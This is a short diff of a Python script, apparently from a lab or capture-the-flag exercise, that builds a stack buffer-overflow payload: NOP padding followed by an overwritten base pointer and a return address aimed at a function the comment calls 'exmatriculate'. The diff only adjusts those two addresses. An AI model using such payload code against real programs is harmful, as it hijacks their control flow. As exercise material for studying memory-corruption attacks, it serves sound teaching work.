@@ -12,12 +12,12 @@ import sys
 content = bytearray(0x90 for i in range(68)) 
 
 # adding the basepointer address 
-base_pointer_address = 0xffffc860
+base_pointer_address = 0xffffc858
 
 content[48:52] = (base_pointer_address).to_bytes(4, byteorder='little' )
 
 
-system_addr = 0x804b100 # The address of exmatriculate 
+system_addr = 0x0804b100 # The address of exmatriculate 
 
 content[52:56] = (system_addr).to_bytes(4, byteorder='little' )
 
